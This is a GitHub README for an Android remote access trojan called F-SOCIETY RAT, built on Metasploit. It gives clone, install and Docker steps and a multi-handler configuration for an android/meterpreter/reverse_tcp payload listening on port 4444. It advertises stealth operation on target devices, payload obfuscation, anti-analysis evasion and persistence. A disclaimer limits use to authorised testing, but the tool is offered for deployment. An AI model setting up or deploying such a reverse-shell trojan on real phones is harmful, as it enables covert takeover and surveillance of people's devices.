## F-SOCIETY RAT
https://img.shields.io/badge/F--SOCIETY-RAT-red
https://img.shields.io/badge/Metasploit-Android-blue
https://img.shields.io/badge/Security-Testing-orange

A powerful Remote Administration Tool (RAT) built on the Metasploit Framework specifically designed for Android penetration testing and security assessment.

**⚠️ DISCLAIMER**
This tool is developed for educational and authorized security testing purposes only.

Only use on devices you own or have explicit written permission to test

Unauthorized access to computer systems is illegal

The developers are not responsible for any misuse of this software

Users must comply with all applicable laws and regulations

**🚀 Features**
Metasploit Integration: Built on top of the powerful Metasploit framework

Android Targeting: Specifically designed for Android devices

Multiple Payload Options: Various payload types for different scenarios

Easy Deployment: Simple setup and deployment process

Stealth Operations: Designed to run discreetly on target devices


**📋 Prerequisites**
Before installation, ensure you have:

Kali Linux or any Linux distribution

Metasploit Framework installed

Android SDK (for certain advanced features)

Ruby 2.7+

Minimum 4GB RAM

2GB free disk space




🔧 Installation Process
Method 1: Automated Installation (Recommended)
bash
# Clone the repository
git clone https://github.com/Athexhacker/f-society-rat.git
cd f-society-rat

# Run This Fisrt
`chmod +x set-up.sh`

# Run the installation script
`bash install_requirements.sh`
# Run Finall Command
`bash run.sh`


**Method 2: Metasploit Installation**
bash
# Update system packages
`sudo apt update && sudo apt upgrade -y`

# Install Metasploit (if not already installed)
`bash set-up.sh`

# Clone F-SOCIETY RAT
git clone https://github.com/Athexhacker/f-society-rat.git
cd f-society-rat

# Run and enjoy
bash run.sh





**Method 3: Docker Installation**
bash
# Pull the Docker image
docker pull your-dockerhub/f-society-rat:latest

# Or build from Dockerfile
docker build -t f-society-rat .

# Run the container
docker run -it --name f-society-rat -p 4444:4444 f-society-rat




🛠️ Configuration
Database Setup
bash
# Initialize Metasploit database
sudo msfdb init

# Start database service
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Use the multi-handler
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit



## 🔒 Security Features
Payload Obfuscation: Advanced obfuscation techniques

Anti-Analysis: Detection evasion methods

Persistence: Various persistence mechanisms

Encryption: Secure communication channels

## Remember: With great power comes great responsibility. Use this tool ethically and legally.

<div align="center">
F-SOCIETY RAT - Power in your hands, responsibility in your heart

</div>